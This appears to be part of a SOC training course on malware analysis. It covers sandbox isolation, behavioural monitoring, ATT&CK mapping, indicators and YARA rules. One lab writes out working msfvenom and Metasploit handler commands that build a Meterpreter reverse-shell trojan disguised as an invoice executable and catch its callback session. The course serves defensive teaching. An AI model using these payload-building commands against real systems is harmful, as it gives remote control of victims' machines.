+<div class="box intro"><span class="box-t">The rule you never break</span><p>Dynamic analysis means <strong>executing live malware</strong>. Do it wrong and the sample spreads to your host, your network, or the internet. So the analyst&#39;s first job is the <strong>blast chamber</strong>: a disposable VM with a snapshot, no path to anything you care about, and monitoring tools armed before detonation.</p></div><div class="box warn"><span class="box-t">Non-negotiable isolation checklist</span><p><strong>1) Snapshot</strong> the clean VM (you will revert after every run). <strong>2) Host-only / no network</strong>, or a fake-internet like INetSim, so the sample cannot reach real victims or its real C2. <strong>3) No shared folders / clipboard</strong> to the host. <strong>4) Non-persistent</strong> &mdash; treat the VM as burned after each detonation. <strong>5) Tools armed first</strong> (ProcMon, TCPView running before you double-click).</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 190" role="img" aria-label="The malware sandbox: an isolated analysis VM with monitoring, cut off from the host and the real network. Click each control.">
+          <rect x="40" y="30" width="500" height="130" rx="12" fill="#1a1f2a" stroke="#ff7043" stroke-dasharray="5 4"/><text class="d-title" x="290" y="54" text-anchor="middle" font-size="13" fill="#ff7043">ISOLATED ANALYSIS VM (snapshot)</text>
+          <g class="node" data-node="snap" tabindex="0"><rect x="60" y="70" width="150" height="34" rx="7" fill="#12241c" stroke="#4ade80"/><text class="d-sub" x="135" y="92" text-anchor="middle">clean snapshot</text></g>
+          <g class="node" data-node="mon" tabindex="0"><rect x="220" y="70" width="150" height="34" rx="7" fill="#12241c" stroke="#4ade80"/><text class="d-sub" x="295" y="92" text-anchor="middle">tools armed</text></g>
+          <g class="node" data-node="det" tabindex="0"><rect x="380" y="70" width="140" height="34" rx="7" fill="#241417" stroke="#ff7043"/><text class="d-sub" x="450" y="92" text-anchor="middle">detonate</text></g>
+          <g class="node" data-node="net" tabindex="0"><rect x="140" y="116" width="290" height="34" rx="7" fill="#1f2533" stroke="#fbbf24"/><text class="d-sub" x="285" y="138" text-anchor="middle">host-only net / INetSim fake internet</text></g>
+          <line x1="540" y1="95" x2="600" y2="95" stroke="#e63946" stroke-width="2" stroke-dasharray="4 3"/><text x="640" y="80" text-anchor="middle" font-size="11" fill="#e63946">NO path</text>
+          <rect x="680" y="50" width="220" height="40" rx="9" fill="#1f2533" stroke="#22d3ee"/><text class="d-sub" x="790" y="74" text-anchor="middle">your HOST + real network</text>
+          <rect x="680" y="108" width="220" height="40" rx="9" fill="#1f2533" stroke="#22d3ee"/><text class="d-sub" x="790" y="132" text-anchor="middle">the real internet / real C2</text>
+        </svg>
+        <div class="dgm-hint">Click each control &mdash; why it exists and what breaks without it.</div>
+        <div class="dgm-detail" data-detail="snap"><h5><span class="dd-tag">SNAPSHOT</span>Revert after every run</h5><p><b>Take a clean snapshot before detonation and roll back to it after.</b> Malware changes the box permanently; without a snapshot your &quot;clean&quot; VM is contaminated for the next sample and your results are garbage.</p></div>
+        <div class="dgm-detail" data-detail="mon"><h5><span class="dd-tag">TOOLS ARMED</span>Start monitoring first</h5><p><b>ProcMon, TCPView/Wireshark, Regshot must be running BEFORE you launch the sample.</b> Malware acts in the first second &mdash; if you start the tools after, you miss the persistence and the first beacon.</p></div>
+        <div class="dgm-detail" data-detail="det"><h5><span class="dd-tag">DETONATE</span>Run it, then watch and wait</h5><p><b>Launch the sample and let it run for a few minutes.</b> Watch processes spawn, connections open, files/registry change. Some malware sleeps to evade sandboxes &mdash; give it time, or fast-forward the clock.</p></div>
+        <div class="dgm-detail" data-detail="net"><h5><span class="dd-tag">NETWORK</span>Fake, not real</h5><p><b>Host-only networking with a fake-internet service (INetSim/FakeNet) lets the malware &quot;reach&quot; its C2 &mdash; so you can see the callback &mdash; without touching the real internet.</b> Full air-gap is safest but you see no network behaviour; the fake-internet is the analyst&#39;s compromise.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; verify isolation before you ever detonate</span><pre><code># On the analysis VM, PROVE it cannot reach the real world before running anything:
+ping -c1 8.8.8.8            # should FAIL (or hit your fake-internet, never the real one)
+ip route                    # confirm no route to your host/LAN
+# only when this is right do you take the snapshot and arm the tools</code></pre><p style="margin-top:8px"><b>You should see:</b> if the VM can reach <span class="mono">8.8.8.8</span>, so can the malware &mdash; stop and fix isolation first. Confirming containment is the step beginners skip and regret.</p></div><div class="box key-takeaway"><span class="box-t">Chamber before sample</span><p><strong class="hl hl-d">Never run malware on anything you cannot burn.</strong> Snapshot, isolate the network, arm the tools &mdash; in that order &mdash; every single time. The discipline is the skill; the tools are easy.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Dynamic: watch it live">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P14</span><span class="tag tool">Tool &middot; ProcMon + TCPView</span><span class="time">&#9201; 8 min</span></div>
+      <h1>Dynamic Analysis &mdash; Watch the Malware Work</h1>
+      <p class="lede">Detonate in the chamber and read the behaviour: what it spawns, what it changes, and who it calls. This is what packing cannot hide.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Three lenses on one detonation</span><p>With the chamber built, you run the sample and watch through three lenses: <strong>ProcMon</strong> (every file, registry, and process operation), <strong>TCPView / CurrPorts</strong> (live network connections per process), and a packet capture for the C2 detail. Together they reconstruct the lifecycle you learned on P4 &mdash; execution, persistence, C2, actions &mdash; from live evidence.</p></div>
+      <h2 class="mono" style="color:var(--orange)"><span class="h-t">ProcMon + TCPView + CurrPorts &mdash; the 7-part frame</span></h2>
+<div class="tbl-scroll">
+<table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+<tbody>
+<tr><td style="width:150px"><strong>What it is</strong></td><td><b>Process Monitor (ProcMon)</b> logs real-time file/registry/process/thread activity; <b>TCPView</b> and <b>CurrPorts</b> show live TCP/UDP endpoints per process &mdash; all Sysinternals-class behavioural monitors.</td></tr>
+<tr><td style="width:150px"><strong>Why it exists</strong></td><td>To capture what the malware actually <em>does</em> at runtime &mdash; the behaviour a packer or obfuscator cannot hide, because the code must unpack and act to function.</td></tr>
+<tr><td style="width:150px"><strong>The method</strong></td><td>Arm all tools, detonate, let it run, then <strong>filter ProcMon</strong> to the sample&#39;s process (and its children): watch for a Run-key write (persistence), a dropped file, and TCPView lighting up with an outbound connection (C2).</td></tr>
+<tr><td style="width:150px"><strong>Real syntax</strong></td><td><pre><code># ProcMon filter: Process Name is sample.exe -> Include
+#   look for RegSetValue on ...\CurrentVersion\Run   (persistence)
+#   CreateFile of a dropped payload in %TEMP% / %APPDATA%
+# TCPView: sample.exe -> ESTABLISHED 45.66.12.9:443   (C2 IOC)
+# capture the beacon:
+wireshark  # or:  tcpdump -i any host 45.66.12.9 -w beacon.pcap</code></pre></td></tr>
+<tr><td style="width:150px"><strong>Read the output</strong></td><td><b>Parent&rarr;child</b> tree (Word&rarr;PowerShell = bad), a <b>Run-key / scheduled-task</b> write = persistence, a <b>dropped file</b> = second stage, an <b>outbound connection</b> to a rare host/port = C2. Each maps to an ATT&amp;CK technique.</td></tr>
+<tr><td style="width:150px"><strong>What it feeds</strong></td><td>The behaviours become the incident timeline and the IOCs (dropped filenames, C2 IP/port, registry paths) &mdash; and the fields your Sigma rule keys on in Lab D.</td></tr>
+<tr><td style="width:150px"><strong>SOC flip</strong></td><td><span style="color:var(--green)">Everything you watch here has a log-side twin:</span> the Run-key write &rarr; Sysmon 13, the process spawn &rarr; Sysmon 1 / Event 4688, the connection &rarr; Sysmon 3. Dynamic analysis literally teaches you which fields to detect on.</td></tr>
+</tbody></table>
+</div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; watch a &quot;sample&quot; make a connection &mdash; the dynamic core</span><pre><code># Simulate the detonation-and-watch loop with a benign process:
+ss -tnp        &   # live connections per process (the Linux TCPView)
+curl -s http://example.com >/dev/null   # the 'sample' makes an outbound connection
+ss -tnp | grep curl        # you just caught the process's C2-equivalent connection</code></pre><p style="margin-top:8px"><b>You should see:</b> you correlated a <b>process</b> to the <b>connection it made</b> &mdash; exactly what TCPView does with a real sample. On malware this same step hands you the C2 IP that becomes a network IOC.</p></div><div class="box key-takeaway"><span class="box-t">Behaviour is the ground truth</span><p><strong class="hl hl-d">Packing hides strings; it cannot hide behaviour.</strong> To function, malware must run &mdash; and when it runs, ProcMon and TCPView see the persistence, the drop, and the beacon. Dynamic analysis is where the truth comes out, and where your detection rules are born.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab A: craft the sample">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P15</span><span class="tag lab">Hands-on &middot; everyone &middot; build</span><span class="time">&#9201; 14 min</span></div>
+      <h1>Lab A &mdash; Build a Controlled Trojan</h1>
+      <p class="lede">Create the artifact you will spend the rest of the session analysing. This is the Session 5 payload, reframed as a malware sample.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why build your own sample</span><p>Analysing a real live sample as a beginner is risky and legally fraught. So you build a <strong>known, controlled trojan</strong> with <span class="mono">msfvenom</span> &mdash; you know exactly what it does, which makes it the perfect teaching sample: every string, import, and behaviour you find later, you can check against ground truth.</p></div><div class="box warn"><span class="box-t">Lab-only, isolated network</span><p>This produces working malware. Keep it on the <strong>host-only lab network</strong>, never email or upload it, and delete it when the session ends. The AV on your <em>own</em> host will flag it &mdash; that is the SOC flip working; build it on Kali.</p></div>
+      <ol class="steps">
+<li>
+<b>Generate the trojan</b> &mdash; a Windows reverse-shell payload disguised as an executable (the S5 technique, now our sample):
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.56.101 LPORT=443 \
+  -f exe -o /tmp/lab/invoice_2026.exe</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">invoice_2026.exe</span> is written &mdash; a benign-looking name hiding a RAT payload. That disguise is what makes it a <b>trojan</b>.</li></ul></div>
+</li>
+<li>
+<b>Record ground truth</b> &mdash; note what you know so you can check your analysis against it:
+<pre><code># You KNOW: payload=meterpreter reverse_tcp, C2=192.168.56.101:443, format=PE exe
+sha256sum /tmp/lab/invoice_2026.exe    # this is your sample's identity</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You have the hash and the true behaviour on record. Later, strings/dynamic analysis should <em>rediscover</em> the C2 you already know &mdash; proving the method works.</li></ul></div>
+</li>
+<li>
+<b>Stage a listener</b> (optional, for the dynamic lab) so the &quot;C2&quot; is there when the sample beacons:
+<pre><code># in msfconsole:
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.101
+set LPORT 443
+run</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The handler waits. When you detonate in Lab C, the sample connects back here &mdash; and TCPView will show it.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">Your ground-truth sample</span><p><strong class="hl">You now own a sample whose truth you know.</strong> Everything from here &mdash; hash, strings, imports, behaviour &mdash; you can grade against reality. That is why we build before we analyse.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab B: static analysis">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P16</span><span class="tag lab">Hands-on &middot; everyone &middot; analyse</span><span class="time">&#9201; 16 min</span></div>
+      <h1>Lab B &mdash; Take the Sample Apart (Without Running It)</h1>
+      <p class="lede">Run the full static workflow on your Lab A trojan: hash, reputation, strings, imports. Rediscover the truth you already know.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Prove the safe half works</span><p>You know this sample&#39;s C2 and payload. Now <strong>find them the analyst way</strong> &mdash; without executing it. If static analysis rediscovers the C2 address and the RAT capability, you have proven the workflow you will use on samples whose truth you <em>don&#39;t</em> know.</p></div>
+      <ol class="steps">
+<li>
+<b>Identity + reputation</b> &mdash; hash it and reason about VirusTotal:
+<pre><code>sha256sum /tmp/lab/invoice_2026.exe
+# search the hash on VirusTotal (do not upload — it is lab malware).
+# A vanilla msfvenom payload is well-known: expect a HIGH detection ratio + 'Meterpreter' labels.</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A high ratio and a family label confirm it is known-bad in seconds &mdash; and show why attackers <em>encode/pack</em> to change the hash.</li></ul></div>
+</li>
+<li>
+<b>Strings</b> &mdash; pull readable intent:
+<pre><code>strings -n 8 /tmp/lab/invoice_2026.exe | less
+strings -n 8 /tmp/lab/invoice_2026.exe | grep -Ei '[0-9]{1,3}(\.[0-9]{1,3}){3}|http|ws2_|ssl'</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Networking-related strings (WinSock / SSL) appear, hinting at the callback. A raw payload may also leak host/port artifacts &mdash; the C2 you already know.</li></ul></div>
+</li>
+<li>
+<b>PE imports</b> &mdash; read capability from the import table:
+<pre><code>python3 -c "import pefile;pe=pefile.PE('/tmp/lab/invoice_2026.exe');[print(e.dll.decode()) for e in pe.DIRECTORY_ENTRY_IMPORT]"
+# expect ws2_32.dll (sockets) -> it talks to the network. A tiny import table -> it is encoded/packed.</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">ws2_32.dll</span> (Windows Sockets) in the imports predicts network C2 &mdash; capability inferred without running anything. A near-empty table would itself flag packing.</li></ul></div>
+</li>
+<li>
+<b>Write down the IOCs</b> you recovered &mdash; hash, any host/port, capability &mdash; for the report and the YARA rule:
+<pre><code># IOC sheet (Lab E + Lab D input):
+#   sha256: <your hash>
+#   c2:     192.168.56.101:443   (recovered / expected)
+#   caps:   network sockets, remote shell (meterpreter)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You reconstructed the sample&#39;s identity and intent with <b>zero execution</b>. These IOCs feed straight into your YARA rule and incident report.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">Static rediscovered the truth</span><p><strong class="hl">You found the capability and the C2 without running it.</strong> That is the power of static analysis &mdash; and its limit: a <em>packed</em> sample would have shown a near-empty import table, forcing you into the sandbox. Which is Lab C.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab C: dynamic analysis">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P17</span><span class="tag lab">Hands-on &middot; everyone &middot; detonate</span><span class="time">&#9201; 18 min</span></div>
+      <h1>Lab C &mdash; Detonate and Watch</h1>
+      <p class="lede">Now run the sample in the chamber and capture its live behaviour: the callback, the process, the connection. Behaviour is the proof.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">From &quot;what it is&quot; to &quot;what it does&quot;</span><p>Static said this sample <em>can</em> talk to the network. Dynamic <strong>proves it does</strong> &mdash; you will watch it open the exact connection to your C2. Same sample, the other half of the discipline, inside the isolated chamber from P12.</p></div><div class="box warn"><span class="box-t">Chamber checklist first</span><p>Snapshot taken, network host-only, tools armed (a live connection monitor running), listener staged. Only then detonate. Revert the snapshot when you are done.</p></div>
+      <ol class="steps">
+<li>
+<b>Arm the network monitor</b> before launching &mdash; the equivalent of TCPView on your lab box:
+<pre><code># on the analysis host, watch live connections continuously:
+watch -n1 'ss -tnp'      # Linux 'TCPView'   (on Windows: run TCPView.exe)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The monitor is running <em>before</em> detonation, so you catch the very first beacon &mdash; the mistake beginners make is arming it too late.</li></ul></div>
+</li>
+<li>
+<b>Detonate</b> the sample (in the isolated VM) and watch the connection appear:
+<pre><code># launch the sample (Windows VM):  .\invoice_2026.exe
+# within seconds the monitor shows:
+#   invoice_2026.exe  ->  192.168.56.101:443   ESTABLISHED</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The outbound connection to your C2 lights up &mdash; the RAT callback, exactly as the static import table predicted. That is <b>dynamic confirmation</b>.</li></ul></div>
+</li>
+<li>
+<b>Confirm control</b> at the listener &mdash; the operator side proves it is a live RAT:
+<pre><code># back in msfconsole the handler reports:
+#   [*] Meterpreter session 1 opened (192.168.56.101:443 -> victim)
+meterpreter> getuid      # you are now driving the victim</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A session opens: the sample is a working RAT, proven by behaviour, not inference. Note the session for the timeline.</li></ul></div>
+</li>
+<li>
+<b>Capture the behavioural IOCs</b> &mdash; process, connection, any persistence &mdash; then revert:
+<pre><code># record for the report:
+#   process: invoice_2026.exe (unsigned, user-writable path)
+#   network: 192.168.56.101:443 outbound  (C2 IOC)
+#   persistence: check ProcMon for a Run-key write
+# then: revert the VM snapshot</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You now have both static <em>and</em> behavioural evidence for the same sample &mdash; the complete triage. Revert the chamber to clean.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">Both halves, one sample</span><p><strong class="hl hl-d">Static told you what it is; dynamic proved what it does.</strong> Together they give you the full story &mdash; identity, capability, and confirmed behaviour &mdash; which is exactly what an incident report and a detection rule need.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Break &amp; checkpoint">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P18</span><span class="tag break">Pause &middot; 10 min</span><span class="time">&#9201; 10 min</span></div>
+      <h1>Halfway &mdash; Both Chairs So Far</h1>
+      <p class="lede">You have built a sample and taken it apart two ways. Reset, then flip fully to the defender who has to catch the next one.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you have done</span><p>First half: the <strong>attacker&#39;s artifact</strong> and the <strong>analyst&#39;s workflow</strong>. You classified malware by behaviour, walked the lifecycle, built a controlled trojan, and analysed it static (hash, strings, imports) and dynamic (detonate, watch the C2). Second half is pure defence: map it to ATT&amp;CK, turn behaviour into IOCs, and write the <strong>YARA and Sigma rules</strong> that catch it.</p></div><div class="box do"><span class="box-t">Stretch-break checklist</span><p>Revert your analysis VM to a clean snapshot. Save your strings output and IOC sheet &mdash; you will feed them into the YARA rule. Keep the msfconsole handler notes for the timeline. Back in five for the detection half.</p></div><div class="box key-takeaway"><span class="box-t">The pivot</span><p><strong class="hl">Everything you found as an analyst becomes a detection.</strong> A C2 IP is a network rule; a unique string is a YARA pattern; a process behaviour is a Sigma rule. The second half turns evidence into signatures.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Malware &amp; ATT&amp;CK">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P19</span><span class="tag theory">Method &middot; the common language</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Mapping Behaviour to MITRE ATT&amp;CK</h1>
+      <p class="lede">A named family is only useful to those who read the write-up. A mapped behaviour is understood by every analyst on earth. Learn the language.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why map, not just name</span><p>&quot;It&#39;s Emotet&quot; helps only if you already know Emotet. &quot;It achieves persistence via a Run key (<span class="mono">T1547.001</span>), beacons over HTTPS (<span class="mono">T1071.001</span>), and dumps LSASS (<span class="mono">T1003.001</span>)&quot; tells <em>every</em> analyst exactly what it did and how to detect each step. <strong>MITRE ATT&amp;CK</strong> is that shared vocabulary &mdash; and it turns your triage into a checklist of detections.</p></div>
+      <div class="tbl-scroll">
+      <table><colgroup><col style="width:16%"><col style="width:28%"><col style="width:30%"><col style="width:26%"></colgroup>
+      <thead><tr><th>Lifecycle stage</th><th>Malware behaviour you saw</th><th>ATT&amp;CK technique</th><th>Where you detect it</th></tr></thead>
+      <tbody>
+      <tr><td>Execution</td><td>user runs the trojan; Word spawns PowerShell</td><td>T1204 User Execution · T1059 Command/Scripting</td><td>Sysmon 1 / Event 4688 (parent&rarr;child)</td></tr>
+      <tr><td>Persistence</td><td>Run key / scheduled task / service</td><td>T1547.001 · T1053.005 · T1543.003</td><td>Sysmon 13 (reg) · 7045 (service)</td></tr>
+      <tr><td>Priv-esc</td><td>token abuse to SYSTEM (S6)</td><td>T1134 Access Token Manipulation</td><td>Event 4672</td></tr>
+      <tr><td>Defense evasion</td><td>packing; LOLbins; delete shadow copies</td><td>T1027 Obfuscation · T1218 System Binary Proxy · T1490</td><td>command-line + Script Block (4104)</td></tr>
+      <tr><td>Credential access</td><td>dump LSASS (Mimikatz)</td><td>T1003.001 LSASS Memory</td><td>Sysmon 10 (lsass ProcessAccess)</td></tr>
+      <tr><td>C2</td><td>beacon to the operator over 443</td><td>T1071.001 Web Protocols · T1573 Encrypted Channel</td><td>Sysmon 3 · proxy/NetFlow</td></tr>
+      <tr><td>Impact</td><td>encrypt files for ransom</td><td>T1486 Data Encrypted for Impact</td><td>mass file-write + vssadmin</td></tr>
+      </tbody></table></div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; map your own sample&#39;s behaviours to techniques</span><pre><code># Take each behaviour you observed in Labs B/C and give it an ATT&CK ID:
+#   outbound 192.168.56.101:443   ->  T1071.001  (Application Layer Protocol: Web)
+#   ws2_32 imports / sockets      ->  supports  T1071
+#   (if you saw a Run-key write)  ->  T1547.001 (Registry Run Keys)
+# a mapped sample is a detection checklist, not a mystery</code></pre><p style="margin-top:8px"><b>You should see:</b> each behaviour now has a universal ID and a matching data source. This mapping <b>is</b> the bridge from analysis to detection &mdash; every technique points at the log you rule on.</p></div><div class="box key-takeaway"><span class="box-t">Behaviour &rarr; technique &rarr; detection</span><p><strong class="hl hl-d">ATT&amp;CK turns a sample into a to-do list.</strong> Each technique names a data source and a detection. Map the behaviour and you have already decided which rules to write &mdash; which is the next page.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="IOCs &amp; the detection surface">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P20</span><span class="tag theory">Defensive &middot; what to hunt</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Indicators of Compromise &mdash; Host, Network, Behaviour</h1>
+      <p class="lede">Analysis produces evidence; detection needs indicators. Learn the three tiers of IOC and why the durable ones are behavioural.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Not all indicators are equal</span><p>Your labs produced indicators: a hash, a C2 IP, a filename, a registry path, a process behaviour. These sit on a <strong>Pyramid of Pain</strong> &mdash; the higher up, the more it costs the attacker to change, and the more durable your detection. A hash is trivial to change; a behaviour (TTP) is expensive. Click each tier.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 230" role="img" aria-label="Three tiers of indicator: host artifacts, network indicators, and behaviours/TTPs, from easy-to-change to hard-to-change. Click each.">
+          <g class="node" data-node="host" tabindex="0"><rect x="20" y="40" width="280" height="150" rx="10" fill="#1a1f2a" stroke="#22d3ee"/><text class="d-title" x="160" y="70" text-anchor="middle" font-size="14" fill="#22d3ee">HOST artifacts</text><text class="d-sub" x="160" y="96" text-anchor="middle">file hash · filename</text><text class="d-sub" x="160" y="116" text-anchor="middle">registry key · mutex</text><text class="d-sub" x="160" y="140" text-anchor="middle">dropped path</text><text class="d-sub" x="160" y="168" text-anchor="middle" fill="#e63946">easy for attacker to change</text></g>
+          <g class="node" data-node="net" tabindex="0"><rect x="330" y="40" width="280" height="150" rx="10" fill="#1f2533" stroke="#fbbf24"/><text class="d-title" x="470" y="70" text-anchor="middle" font-size="14" fill="#fbbf24">NETWORK indicators</text><text class="d-sub" x="470" y="96" text-anchor="middle">C2 IP · domain</text><text class="d-sub" x="470" y="116" text-anchor="middle">URL · JA3 / TLS cert</text><text class="d-sub" x="470" y="140" text-anchor="middle">user-agent</text><text class="d-sub" x="470" y="168" text-anchor="middle" fill="#fbbf24">moderate cost to change</text></g>
+          <g class="node" data-node="ttp" tabindex="0"><rect x="640" y="40" width="280" height="150" rx="10" fill="#12241c" stroke="#4ade80"/><text class="d-title" x="780" y="70" text-anchor="middle" font-size="14" fill="#4ade80">BEHAVIOUR / TTP</text><text class="d-sub" x="780" y="96" text-anchor="middle">Word &rarr; PowerShell -enc</text><text class="d-sub" x="780" y="116" text-anchor="middle">LSASS access · vssadmin</text><text class="d-sub" x="780" y="140" text-anchor="middle">Run-key persistence</text><text class="d-sub" x="780" y="168" text-anchor="middle" fill="#4ade80">expensive to change &mdash; durable</text></g>
+        </svg>
+        <div class="dgm-hint">Click each tier &mdash; the indicators, and how long your detection survives.</div>
+        <div class="dgm-detail" data-detail="host"><h5><span class="dd-tag">HOST · brittle</span>Cheap to collect, cheap to evade</h5><p><b>Hashes, filenames, mutexes, registry paths.</b> Fast to block and great for known samples &mdash; but the attacker changes a byte (new hash) or renames a file and your indicator is dead. Use them, but never rely on them alone. This is the bottom of the Pyramid of Pain.</p></div>
+        <div class="dgm-detail" data-detail="net"><h5><span class="dd-tag">NETWORK · moderate</span>C2 costs something to move</h5><p><b>C2 IPs, domains, URLs, TLS/JA3 fingerprints, user-agents.</b> Rotating infrastructure costs the attacker time and money, so these last longer than hashes. A young/rare domain your host suddenly beacons to is a strong lead. Block at the proxy/firewall.</p></div>
+        <div class="dgm-detail" data-detail="ttp"><h5><span class="dd-tag">TTP · durable</span>The detections that hurt attackers</h5><p><b>Behaviours: a Run-key write, LSASS access, <span class="mono">vssadmin delete shadows</span>, Word spawning encoded PowerShell.</b> To evade these the attacker must change <em>how they operate</em> &mdash; expensive and slow. Behavioural rules (YARA on content, Sigma on logs) are what you invest in. Top of the pyramid.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; sort your lab IOCs by durability</span><pre><code># From Labs B/C, rank what you would deploy:
+#   sha256 hash            -> HOST   (block, but expect it to change)
+#   192.168.56.101:443     -> NETWORK (block C2, decent shelf life)
+#   'unsigned exe in %TEMP% making outbound 443 + Run-key' -> TTP (durable rule)
+# invest most in the bottom line — the behaviour</code></pre><p style="margin-top:8px"><b>You should see:</b> the same incident yields indicators at three durabilities. Blocking the hash is instant but temporary; the behavioural rule is harder to write but survives the attacker&#39;s next rebuild.</p></div><div class="box key-takeaway"><span class="box-t">Climb the pyramid</span><p><strong class="hl hl-d">Block the hash today, but detect the behaviour forever.</strong> Host IOCs are free wins with a short shelf life; behavioural detections cost more to write and cost the attacker far more to evade. Both go in the report &mdash; weight your effort upward.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="YARA">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P21</span><span class="tag tool">Tool &middot; write the signature</span><span class="time">&#9201; 8 min</span></div>
+      <h1>YARA &mdash; Signatures for Files</h1>
+      <p class="lede">The analyst&#39;s pattern-matching language: describe what a malware family looks like on disk, then hunt for it across every endpoint.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Turn your strings into a hunt</span><p>In Lab B you pulled distinctive strings out of the sample. <strong>YARA</strong> lets you turn those into a portable <em>signature</em>: a rule that matches any file containing that combination of patterns. Write one good rule and you catch not just your sample but its whole family &mdash; across every box you can scan.</p></div>
+      <h2 class="mono" style="color:var(--orange)"><span class="h-t">YARA &mdash; the 7-part frame</span></h2>
+<div class="tbl-scroll">
+<table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+<tbody>
+<tr><td style="width:150px"><strong>What it is</strong></td><td>A rule language and scanner for classifying files by content patterns &mdash; text strings, hex byte sequences, and conditions combining them. The <em>de facto</em> standard for file-based malware signatures.</td></tr>
+<tr><td style="width:150px"><strong>Why it exists</strong></td><td>To share &quot;this family looks like <em>this</em>&quot; in a portable, precise way, so any analyst or tool can hunt for a family across many files at once &mdash; on endpoints, in email gateways, in threat-intel feeds.</td></tr>
+<tr><td style="width:150px"><strong>The method</strong></td><td>Pick <strong>distinctive</strong> strings/bytes from your static analysis (unique enough to avoid false positives), then write a <span class="mono">condition</span> that requires a meaningful combination &mdash; not any one common string.</td></tr>
+<tr><td style="width:150px"><strong>Real syntax</strong></td><td><pre><code>rule Lab_Meterpreter_Trojan {
+  meta:
+    author = "soc-student"
+    ref    = "session 7 lab"
+  strings:
+    $c2   = "192.168.56.101" ascii
+    $api1 = "ws2_32.dll" ascii nocase
+    $mz   = { 4D 5A }            // PE magic
+  condition:
+    $mz at 0 and $api1 and $c2
+}
+
+// scan:  yara -r lab_rules.yar /samples/</code></pre></td></tr>
+<tr><td style="width:150px"><strong>Read the output</strong></td><td>YARA prints <span class="mono">RuleName  filepath</span> for every match. A hit means the file contains your pattern combination &mdash; verify it is a true positive, then treat matches as the same family.</td></tr>
+<tr><td style="width:150px"><strong>What it feeds</strong></td><td>A validated rule goes to the EDR/scanner and the threat-intel share; matches become new samples to triage; the rule name maps back to an ATT&amp;CK/family label in the report.</td></tr>
+<tr><td style="width:150px"><strong>SOC flip</strong></td><td><span style="color:var(--green)">YARA is content-based, so it beats hash-rotation but not packing.</span> A packer hides your strings until runtime &mdash; so pair file-side YARA with log-side <b>Sigma</b> (behaviour) for coverage the attacker cannot dodge by re-encoding.</td></tr>
+</tbody></table>
+</div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; write and run a tiny YARA rule</span><pre><code>cat > demo.yar <<'EOF'
+rule finds_c2_string {
+  strings: $c2 = "192.168.56.101" ascii
+  condition: $c2
+}
+EOF
+yara demo.yar /tmp/lab/invoice_2026.exe    # prints the rule name + path on a match</code></pre><p style="margin-top:8px"><b>You should see:</b> your first working signature. On a match YARA prints <span class="mono">finds_c2_string /tmp/lab/invoice_2026.exe</span> &mdash; you just built a hunt that finds this sample anywhere. Broaden the condition to catch the family, not just one file.</p></div><div class="box key-takeaway"><span class="box-t">Signatures scale your analysis</span><p><strong class="hl hl-d">One good rule catches a family, not a file.</strong> The skill is choosing <em>distinctive</em> patterns and a <em>combining condition</em> &mdash; specific enough to avoid false positives, general enough to catch variants. That judgement is the craft.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="The malware SOC flip">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S07 &middot; P22</span><span class="tag defensive">Defender &middot; the consolidated flip</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Every Behaviour Today, and the Log It Left</h1>
